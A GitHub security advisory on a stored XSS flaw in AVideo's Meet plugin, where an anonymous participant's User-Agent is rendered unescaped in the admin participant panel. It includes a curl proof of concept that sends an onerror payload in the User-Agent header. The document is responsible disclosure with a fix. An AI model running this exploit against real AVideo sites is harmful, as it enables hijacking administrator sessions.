# [M] AVideo Meet plugin: anonymous-to-admin stored XSS via unescaped participant User-Agent in getMeetInfo.json.php Participants panel

## Summary
Severity: Medium
Advisory: GHSA-7cqp-7cfv-6c3q
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N/E:P (CVSS_V4)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-7cqp-7cfv-6c3q
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
### Summary

The Meet plugin stores the raw HTTP `User-Agent` header of every meeting participant and later renders it without output encoding in the meeting-management ("Participants") panel that the meeting host and site administrators open. An anonymous, unauthenticated attacker can join any public meeting while sending a `User-Agent` header containing an HTML payload. The payload is persisted in `meet_join_log.user_agent` and, when the host or an administrator opens the participant list, is injected verbatim into their DOM, executing attacker-controlled JavaScript in a privileged, authenticated session. This is a cross-privilege stored XSS: an anonymous visitor obtains script execution in the administrator's browser.

### Affected versions

`WWBN/AVideo` at current `master` commit `e8d6119f3cb1b849149906efeb0a41fc024f59f8` (and prior releases shipping the same code path). Not patched at the time of this report.

### Privilege required

- **Writer (attacker):** unauthenticated / anonymous. Joining a public meeting requires no account and no password.
- **Victim (trigger):** the meeting host or any site administrator who opens the meeting's participant-management panel.

### Vulnerable code (file:line)

The stored value is never sanitized on write, then echoed without encoding on read.

Write path — `plugin/Meet/Objects/Meet_join_log.php:147`:

```php
    public function setUser_agent($user_agent)
    {
        $this->user_agent = $user_agent;
    }
```

Write path — `plugin/Meet/Objects/Meet_join_log.php:177`:

```php
    public static function log($meet_schedule_id)
    {
        $log = new Meet_join_log(0);
        $log->setIp(getRealIpAddr());
        $log->setMeet_schedule_id($meet_schedule_id);
        $log->setUser_agent((isMobile() ? "Mobile: " : "") . get_browser_name());
        $log->setUsers_id(User::getId());
        return $log->save();
    }
```

`get_browser_name()` (`objects/functionsBrowser.php:239` and `:242`) returns the original-case `User-Agent` verbatim for any agent not matched to a known browser name:

```php
        return '[Bot] Other '.$user_agent;
    }
    //_error_log("Unknow user agent ($t) IP=" . getRealIpAddr() . " URI=" . getRequestURI());
    return 'Other (Unknown) '.$user_agent;
```

Only the lowercased match copy is used for classification; the returned string still contains the raw, original `$_SERVER['HTTP_USER_AGENT']`. Because the value bypasses AVideo's object-setter sanitization layer (unlike `Meet_schedule::setTopic()`, which calls `xss_esc()`), the raw bytes reach the database unchanged.

Read path — `plugin/Meet/getMeetInfo.json.php:71`:

```php
                        echo '<li class="list-group-item">#' . $count . " - " . User::getNameIdentificationById($value['users_id']) . ' <span class="badge">' . $value['created'] . '</span><br><small class="text-muted">' . $value['user_agent'] . '</small></li>';
```

`$value['user_agent']` is concatenated into the HTML with no `htmlspecialchars()`. The reader endpoint is gated by `Meet_schedule::canManageSchedule()` (site admin OR the schedule owner), so the value is rendered in a privileged context.

### How input reaches the sink

The join that records the log is reachable anonymously through `plugin/Meet/iframe.php:11` and `:17`:

```php
if (!Meet::validatePassword($meet_schedule_id, @$_REQUEST['meet_password'])) {
    header("Location: {$global['webSiteRootURL']}plugin/Meet/confirmMeetPassword.php?meet_schedule_id=$meet_schedule_id");
    exit;
}
$objLive = AVideoPlugin::getObjectData("Live");
Meet_join_log::log($meet_schedule_id);
```

For a public meeting (`public = 2`), `Meet::validatePassword()` returns `true` for an anonymous request (no password set), so `Meet_join_log::log()` runs and stores the attacker's `User-Agent`. On the read side, the host/admin opens the participant modal, whose JavaScript fetches `getMeetInfo.json.php` and injects the response with jQuery `.html()` in `plugin/Meet/meet_scheduled.php:266`:

```js
                                                                success: function (response) {
                                                                    if (response.error) {
                                                                        avideoAlert("<?php echo __("Sorry!"); ?>", response.msg, "error");
                                                                    } else {
                                                                        $('#Meet_schedule2<?php echo $meet_scheduled, $manageMeetings; ?>Modal .modal-body').html(response.html);
                                                                    }
```

`.html(response.html)` parses and inserts the attacker-controlled markup, so the injected `onerror` handler executes in the host/admin DOM.

### Proof of concept — end-to-end reproduction (against pinned version)

Deployed against the project's official Docker stack (php8.5/apache2.4 + mariadb), pinned commit `e8d6119f3cb1b849149906efeb0a41fc024f59f8`. `<TARGET>` is the deployed host.

```bash
# 1. As the admin, create a PUBLIC meeting (public=2, no password):
curl -sk -H 'Host: <TARGET>' -H "Cookie: $ADMIN_SESSION" -H 'Referer: https://<TARGET>/' \
  --data-urlencode 'RoomTopic=Demo' --data-urlencode 'public=2' --data-urlencode 'RoomPasswordNew=' \
  'https://<TARGET>/plugin/Meet/saveMeet.json.php'
# Response: {"error":false,"meet_schedule_id":1, ...}

# 2. As an ANONYMOUS attacker (no cookie), join the meeting while sending an HTML
#    payload in the User-Agent. The trailing token " http" forces get_browser_name()
#    into the raw-reflecting "[Bot] Other" branch.
curl -sk -H 'Host: <TARGET>' -H 'Referer: https://<TARGET>/' \
  -A '<img src=x onerror=alert(document.domain)> http' \
  'https://<TARGET>/plugin/Meet/iframe.php?meet_schedule_id=1&meet_password='
# HTTP 200. Stored row: meet_join_log.user_agent =
#   [Bot] Other <img src=x onerror=alert(document.domain)> http

# 3. As the host/admin, open the participant panel:
curl -sk -H 'Host: <TARGET>' -H "Cookie: $ADMIN_SESSION" -H 'Referer: https://<TARGET>/plugin/Meet/' \
  'https://<TARGET>/plugin/Meet/getMeetInfo.json.php?meet_schedule_id=1'
```

The JSON `html` field contains the payload **unescaped**:

```html
<small class="text-muted">[Bot] Other <img src=x onerror=alert(document.domain)> http</small>
```

When the admin opens the participant modal in a browser, jQuery `.html(response.html)` injects this markup and the `onerror` handler executes in the admin's authenticated session, printing `document.domain`.

**Negative control:** joining with a benign browser `User-Agent` (`Mozilla/5.0 (Windows NT 10.0) Chrome/120.0 Safari/537.36`) causes `get_browser_name()` to return `Chrome`, which renders as plain text `<small class="text-muted">Chrome</small>` with no markup injection.

### Impact

- Cross-privilege stored XSS: an unauthenticated, anonymous visitor achieves JavaScript execution in the meeting host's and site administrator's authenticated browser sessions.
- Full account-takeover surface: theft of the admin session, CSRF-token exfiltration, and arbitrary authenticated actions (user and permission changes, plugin configuration) performed as the administrator.
- The payload persists in the database and fires for every privileged user who reviews the participant list of the affected meeting.

### Suggested fix

Encode the stored value at the sink in `plugin/Meet/getMeetInfo.json.php:71`:

```php
. '</span><br><small class="text-muted">' . htmlspecialchars($value['user_agent'], ENT_QUOTES, 'UTF-8') . '</small></li>';
```

Defense in depth: sanitize the value on write in `Meet_join_log::setUser_agent()`, mirroring the setter-layer encoding used by `Meet_schedule::setTopic()` (`xss_esc()`), so any other current or future reader of `meet_join_log.user_agent` is also protected.

### Fix PR

A fix is provided on the advisory's private temporary fork: `WWBN/AVideo-ghsa-7cqp-7cfv-6c3q#1` (encodes the participant `User-Agent` at the sink with `htmlspecialchars($value['user_agent'], ENT_QUOTES, 'UTF-8')`).

### Credit

Reported by tonghuaroot.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-7cqp-7cfv-6c3q
- https://github.com/WWBN/AVideo
